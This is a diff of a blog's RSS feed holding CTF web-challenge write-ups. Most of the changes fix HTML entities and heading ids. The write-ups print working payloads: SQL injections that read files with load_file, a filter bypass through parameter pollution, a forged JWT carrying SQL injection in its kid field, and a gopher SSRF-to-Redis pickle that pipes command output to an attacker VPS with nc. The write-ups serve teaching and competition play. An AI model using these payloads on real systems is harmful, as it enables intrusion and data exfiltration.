+&lt;p&gt;?search=&#39;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0A@@GLOBAL.secure_file_priv)b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/Pdn180B.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;BINGOOO ! so let&amp;rsquo;s have our flag now :&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;?search=&amp;rsquo;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Aload_file(&amp;quot;/var/lib/mysql-files/flag/flag.txt&amp;rdquo;))b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
+&lt;p&gt;?search=&#39;)union%0Aselect%0A*%0Afrom%0A((select%0A1)a%0Ajoin%0A(select%0Aload_file(&amp;quot;/var/lib/mysql-files/flag/flag.txt&amp;quot;))b%0Ajoin%0A(select%0A3)c)%0A%23&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;&lt;strong&gt;FLAG&lt;/strong&gt; : Securinets{SecuR3_YourSQL!} , I have enjoyed this task and learned a lot about mysql privileges from it , thank you @bibiwars or should i call you @nox xD If you enjoyed the writeup share it with your friends and don&amp;rsquo;t hesitate to ask me on twitter @BelkahlaAhmed1 :D&lt;/p&gt;
 </description>
@@ -1245,7 +1669,7 @@ i checked the privileges of the current user and the FILE permission was not gra
       <link>https://ahmed-belkahla.me/post/empire-total-securinetsquals20/</link>
       <pubDate>Sat, 21 Mar 2020 00:00:00 +0000</pubDate>
       <guid>https://ahmed-belkahla.me/post/empire-total-securinetsquals20/</guid>
-      <description>&lt;h1 id=&#34;empire-total-1000pts-7-solves-&#34;&gt;&lt;strong&gt;Empire Total (1000pts) (7 Solves)&lt;/strong&gt;&lt;/h1&gt;
+      <description>&lt;h1 id=&#34;empire-total-1000pts-7-solves&#34;&gt;&lt;strong&gt;Empire Total (1000pts) (7 Solves)&lt;/strong&gt;&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/rGcoI7o.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;This task was really so creative and i had so fun solving it , but i can&amp;rsquo;t deny that it was painful :( after reading the description we can say that we aim to dump the database of the website (maybe SQL injection who knows) and fortunately we have the source code so let&amp;rsquo;s download it and begin our trip xD&lt;/p&gt;
 &lt;p&gt;After Visiting the website we find a tool based on Virus Total API , understanding the functionality of the website is really necessary for solving the task, we will cover it in details later, but as a first thought we give an ip address to the website and it will shows Virus Total stats about it&lt;/p&gt;
@@ -1298,7 +1722,7 @@ the results from the database .&lt;/p&gt;
           print(&amp;quot;EXCEPTION: &amp;quot;,e)
           self.resetSQL()
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;exploitation-&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
 &lt;p&gt;So the idea is that if we go to VirusTotal website (&lt;a href=&#34;https://www.virustotal.com/&#34;&gt;https://www.virustotal.com/&lt;/a&gt;) and scan a url ,and then go back to our challenge website and scan the url&amp;rsquo;s ip
 we will find that the url we scanned in VirusTotal website will appear , it&amp;rsquo;s pretty confusing i know so let&amp;rsquo;s have an example&lt;/p&gt;
 &lt;ol&gt;
@@ -1315,7 +1739,7 @@ we will find that the url we scanned in VirusTotal website will appear , it&amp;
 &lt;p&gt;Yeeees ! it&amp;rsquo;s appearing in the results so we now have the control over these values in the urls section of the results.&lt;/p&gt;
 &lt;p&gt;Now here is our scenario , if we look to the vulnerable function &lt;strong&gt;persistURLs&lt;/strong&gt; in VirusTotal.py we can notice the injection in this query (line 430)&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;INSERT INTO &amp;ldquo;+table_name+&amp;rdquo; (ip_id,url,detections,scanned_time) VALUES (&#39;&amp;ldquo;+str(selected_ips[0][&amp;lsquo;id&amp;rsquo;])+&amp;rdquo;&#39;,&#39;&amp;ldquo;+url[&amp;lsquo;URL&amp;rsquo;]+&amp;rdquo;&#39;,&#39;&amp;ldquo;+url[&amp;lsquo;Detections&amp;rsquo;]+&amp;rdquo;&#39;,&#39;&amp;ldquo;+url[&amp;lsquo;Scanned&amp;rsquo;]+&amp;rdquo;&#39;)&lt;/p&gt;
+&lt;p&gt;INSERT INTO &amp;ldquo;+table_name+&amp;rdquo; (ip_id,url,detections,scanned_time) VALUES (&#39;&amp;quot;+str(selected_ips[0][&amp;lsquo;id&amp;rsquo;])+&amp;quot;&#39;,&#39;&amp;quot;+url[&amp;lsquo;URL&amp;rsquo;]+&amp;quot;&#39;,&#39;&amp;quot;+url[&amp;lsquo;Detections&amp;rsquo;]+&amp;quot;&#39;,&#39;&amp;quot;+url[&amp;lsquo;Scanned&amp;rsquo;]+&amp;quot;&#39;)&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;We have control over the &lt;strong&gt;url[&amp;lsquo;URL&amp;rsquo;]&lt;/strong&gt; parameter (the url we scan in VirusTotal Website) so it&amp;rsquo;s now an SQL injection in INSERT INTO values, but we have some constraints :&lt;/p&gt;
 &lt;ol&gt;
@@ -1326,7 +1750,7 @@ we will find that the url we scanned in VirusTotal website will appear , it&amp;
 &lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/Securinets%20Prequals%202k20/Empire%20Total/test.py&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;Finally I opted to this solution, here is the URL we will scan :&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/**/1),(select/**/2)),(&amp;lsquo;102&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
+&lt;p&gt;http://100.26.206.184/?u=&#39;,(select/**/1),(select/**/2)),(&amp;lsquo;102&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;The complete SQL query that will be executed is  :&lt;/p&gt;
 &lt;blockquote&gt;
@@ -1376,7 +1800,7 @@ we will find that the url we scanned in VirusTotal website will appear , it&amp;
       <link>https://ahmed-belkahla.me/post/angstromctf20/</link>
       <pubDate>Thu, 19 Mar 2020 00:00:00 +0000</pubDate>
       <guid>https://ahmed-belkahla.me/post/angstromctf20/</guid>
-      <description>&lt;h1 id=&#34;a-peculiar-query-180pts-73-solves-&#34;&gt;&lt;strong&gt;A Peculiar Query (180pts) (73 Solves)&lt;/strong&gt;&lt;/h1&gt;
+      <description>&lt;h1 id=&#34;a-peculiar-query-180pts-73-solves&#34;&gt;&lt;strong&gt;A Peculiar Query (180pts) (73 Solves)&lt;/strong&gt;&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/A6EHPkW.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;I really liked this web task , we are given this web page that have a search functionality&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/gRutDcV.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
@@ -1441,7 +1865,7 @@ app.listen(port, function() {
 });
 
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;overview-&#34;&gt;Overview&lt;/h2&gt;
+&lt;h2 id=&#34;overview&#34;&gt;Overview&lt;/h2&gt;
 &lt;p&gt;It&amp;rsquo;s pretty obvious that we have an sql injection here ( we are concatenating the user input )&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;const ret = await client.query(&lt;code&gt;SELECT name FROM Criminals WHERE name ILIKE &#39;${q}%&#39;;&lt;/code&gt;);&lt;/p&gt;
@@ -1472,7 +1896,7 @@ const result = await query(q);
 res.render(&amp;quot;home&amp;quot;, {results: result.rows, err: &amp;quot;&amp;quot;});
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Hmmm everything seems okay nah ? but it&amp;rsquo;s a ctf web task we have to find some vulnerabilities ! let&amp;rsquo;s pass to how i did to solve it now, enough boring things&lt;/p&gt;
-&lt;h2 id=&#34;exploitation-&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
 &lt;p&gt;The first thing i thinked about was http parameter pollution in express (read about it &lt;strong&gt;
 &lt;a href=&#34;https://github.com/expressjs/express/issues/1824&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt; if you want ) ,briefly when we enter a get parameter multiple times express
 has a weird interpretation , it will process this parameter as an array for example here, if we pass this in the query :&lt;/p&gt;
@@ -1482,19 +1906,19 @@ has a weird interpretation , it will process this parameter as an array for exam
 &lt;p&gt;&lt;strong&gt;req.query.q&lt;/strong&gt; will be parsed as an array &lt;strong&gt;[&amp;ldquo;hello&amp;rdquo;,&amp;ldquo;allo&amp;rdquo;,&amp;ldquo;fword&amp;rdquo;]&lt;/strong&gt; , so if we go further when we will be iterating of &lt;strong&gt;q&lt;/strong&gt; variable we will be comparing each array field with the filters
 for example, if we pass this query :&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;q=&amp;quot;or 1=1 &amp;ndash; -&amp;amp;q=fword&lt;/p&gt;
+&lt;p&gt;q=&amp;ldquo;or 1=1 &amp;ndash; -&amp;amp;q=fword&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;we will firstly compare &lt;strong&gt;&amp;ldquo;or 1=1 &amp;ndash; -&lt;/strong&gt; and then the second field &lt;strong&gt;fword&lt;/strong&gt; with these filtered chars &lt;strong&gt;[&#39;,-,&amp;quot;,.]&lt;/strong&gt; , they are not equal ! , Youupi we can get our flag now as we passed the check .&lt;/p&gt;
+&lt;p&gt;we will firstly compare &lt;strong&gt;&amp;ldquo;or 1=1 &amp;ndash; -&lt;/strong&gt; and then the second field &lt;strong&gt;fword&lt;/strong&gt; with these filtered chars &lt;strong&gt;[&#39;,-,&amp;rdquo;,.]&lt;/strong&gt; , they are not equal ! , Youupi we can get our flag now as we passed the check .&lt;/p&gt;
 &lt;p&gt;Unfortunately , it&amp;rsquo;s not that easy ,have you forgot the substring function ? an array has not a built in substring function so when we reach the substring part this will raise an error so we won&amp;rsquo;t execute the sql query :/
 Javascript weird behaviour will save us this time ! if we do &lt;strong&gt;[]+[]&lt;/strong&gt; the result is a string , the sum of two arrays is a string so if we enter a &lt;strong&gt;&amp;quot;&lt;/strong&gt; in one query parameter
 we will enter this part&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;censored = true;
 q = q.slice(0, i) + &amp;quot;*&amp;quot; + q.slice(i + 1, q.length);
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;and arrays have a built in slice function so the result of &lt;strong&gt;[]+&amp;rdquo;*&amp;ldquo;+[]&lt;/strong&gt; will be a string , we can now enter our payload with &lt;strong&gt;q=&amp;rsquo;&lt;/strong&gt; in the end to ensure that our array will be a string when it reaches the substring part
+&lt;p&gt;and arrays have a built in slice function so the result of &lt;strong&gt;[]+&amp;quot;*&amp;quot;+[]&lt;/strong&gt; will be a string , we can now enter our payload with &lt;strong&gt;q=&#39;&lt;/strong&gt; in the end to ensure that our array will be a string when it reaches the substring part
 For example :&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;q=&#39;or 1=1 &amp;ndash; -&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=&amp;rsquo;&lt;/p&gt;
+&lt;p&gt;q=&amp;lsquo;or 1=1 &amp;ndash; -&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=a&amp;amp;q=&amp;rsquo;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;will let us pass !&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;FILTERS BYPASSED SUCCESSFULLY&lt;/strong&gt;&lt;/p&gt;
@@ -1520,7 +1944,7 @@ For example :&lt;/p&gt;
       <link>https://ahmed-belkahla.me/post/shinobisworld/</link>
       <pubDate>Thu, 23 Jan 2020 00:00:00 +0000</pubDate>
       <guid>https://ahmed-belkahla.me/post/shinobisworld/</guid>
-      <description>&lt;h1 id=&#34;shinobis-world-1000pts-1-solves-&#34;&gt;&lt;strong&gt;Shinobis World (1000pts) (1 Solves)&lt;/strong&gt;&lt;/h1&gt;
+      <description>&lt;h1 id=&#34;shinobis-world-1000pts-1-solves&#34;&gt;&lt;strong&gt;Shinobis World (1000pts) (1 Solves)&lt;/strong&gt;&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/7X3dgtW.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Hello guys again , in this task we are give the Settings.py of a django Web application , we can notice that the website is using caching with redis that is listening on port 6379 locally !&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/60QSkz4.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
@@ -1553,7 +1977,7 @@ so we can use 127.0.1 and maybe http or gopher protocol , firstly let&amp;rsquo;
 &lt;/ul&gt;
 &lt;p&gt;Final Payload :&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;gopher://127.0.1:6379/aset%20:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC%20&amp;quot;cposix\nsystem\np0\n(S&amp;rsquo;ls|nc YourVPSIP 1234&amp;rsquo;\np1\ntp2\nRp3\n.&amp;rdquo;
+&lt;p&gt;gopher://127.0.1:6379/aset%20:1:views.decorators.cache.cache_page..GET.a906279c6f1b8c76747a8ba71e866d8c.d41d8cd98f00b204e9800998ecf8427e.en-us.UTC%20&amp;quot;cposix\nsystem\np0\n(S&amp;rsquo;ls|nc YourVPSIP 1234&#39;\np1\ntp2\nRp3\n.&amp;quot;
 This Payload will execute ls command and send it to our vps (don&amp;rsquo;t forget to refresh the Shinobis page because it&amp;rsquo;s the page that is being cached)&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt;&lt;/em&gt; You can find the source code of this task in the source code repo of my github repo&lt;/p&gt;
@@ -1568,11 +1992,11 @@ If you have any questions dont forget to contact me and if you liked this writeu
       <link>https://ahmed-belkahla.me/post/jwt-in-a-new-way/</link>
       <pubDate>Wed, 22 Jan 2020 00:00:00 +0000</pubDate>
       <guid>https://ahmed-belkahla.me/post/jwt-in-a-new-way/</guid>
-      <description>&lt;h1 id=&#34;jwt-in-a-new-way-1000pts-0-solves-&#34;&gt;&lt;strong&gt;JWT In a new way (1000pts) (0 Solves)&lt;/strong&gt;&lt;/h1&gt;
+      <description>&lt;h1 id=&#34;jwt-in-a-new-way-1000pts-0-solves&#34;&gt;&lt;strong&gt;JWT In a new way (1000pts) (0 Solves)&lt;/strong&gt;&lt;/h1&gt;
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/YuMeMZE.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
 &lt;p&gt;And finally i&amp;rsquo;m writing a writeup for this task xD i published this task in Securinets Mini CTF and NCSC2.0_CTF but unfortunately it had 0 solves (in fact no one managed to pass the first step) , it took me a lot of time to prepare this task so i hope you enjoy it :D
 However bring your coffee cup and let&amp;rsquo;s begin the road . This Task has 3 steps , the first one is bypassing JWT token with a custom attack (not the regular ones) actually using an SQL injection in one of the token parameters , then we will have to exploit an ssrf to crypt the content of flag file (too much filters here haha)&lt;/p&gt;
-&lt;h2 id=&#34;1st-step--jwt-bypass-&#34;&gt;1st Step : JWT Bypass&lt;/h2&gt;
+&lt;h2 id=&#34;1st-step--jwt-bypass&#34;&gt;1st Step : JWT Bypass&lt;/h2&gt;
 &lt;p&gt;After visiting the link we have a simple web page with a sign in and sign up page ;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://i.imgur.com/y8vDSCL.png&#34; alt=&#34;HOME&#34;&gt;&lt;/p&gt;
 &lt;p&gt;So after registering with random creds and signing in we check the cookies and as the task name refers we find a jwt token&lt;/p&gt;
@@ -1590,7 +2014,7 @@ let&amp;rsquo;s read again the description , we can notice a hint for SQL so may
 &lt;p&gt;As we all know JWT token have 3 sections : Header + Payload + signature&lt;/p&gt;
 &lt;p&gt;Header : typically consists of two parts: the type of the token, which is JWT, and the signing algorithm being used, such as HMAC SHA256 or RSA but here we have also the kid part which is optional&lt;/p&gt;
 &lt;p&gt;Payload : it contains statements about an entity (typically, the user) and additional data .&lt;/p&gt;
-&lt;p&gt;Signature : Simply if we are using HS256 the sig is : Signature= HMACSHA256(BASE64URL(HEADER)+&amp;rsquo;.&amp;lsquo;+BASE64URL(PAYLOAD))&lt;/p&gt;
+&lt;p&gt;Signature : Simply if we are using HS256 the sig is : Signature= HMACSHA256(BASE64URL(HEADER)+&#39;.&#39;+BASE64URL(PAYLOAD))&lt;/p&gt;
 &lt;p&gt;Be careful it&amp;rsquo;s BASE64URL not a regular BASE64 you can read about it here : 
 &lt;a href=&#34;https://fr.wikipedia.org/wiki/Base64#base64url&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;LINK&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;NOTE: you can use the php function hash_hmac(&amp;lsquo;sha256&amp;rsquo;, $msg, $key, true) to sign the token&lt;/p&gt;
@@ -1613,7 +2037,7 @@ let&amp;rsquo;s read again the description , we can notice a hint for SQL so may
 &lt;p&gt;The final token used:&lt;/p&gt;
 &lt;p&gt;eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIidVTmlPbiBTRWxFY1QgMSwnYWJjJyAtLSAtIn0.eyJ1c2VyIjogIiIsInR5cGUiOiAiYWRtaW4ifQ.3cOHXg1U7Mj_I3ag37oeg5KWJYA11T74bbD4NrcMC8A&lt;/p&gt;
 &lt;p&gt;And yeeeeeeees we did it ! but WTF where is our flag ! we need to finish this step before&lt;/p&gt;
-&lt;h2 id=&#34;2nd-step--ssrf--decrypt-&#34;&gt;2nd Step : SSRF + Decrypt&lt;/h2&gt;
+&lt;h2 id=&#34;2nd-step--ssrf--decrypt&#34;&gt;2nd Step : SSRF + Decrypt&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/BLjbHaj.png&#34; alt=&#34;CRYPT&#34;&gt;&lt;/p&gt;
 &lt;p&gt;It&amp;rsquo;s a web application that crypts a txt file and after some tries i figured that it only accepts urls that finish with .txt extension&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://imgur.com/9mPssf6.png&#34; alt=&#34;CRYPT&#34;&gt;&lt;/p&gt;
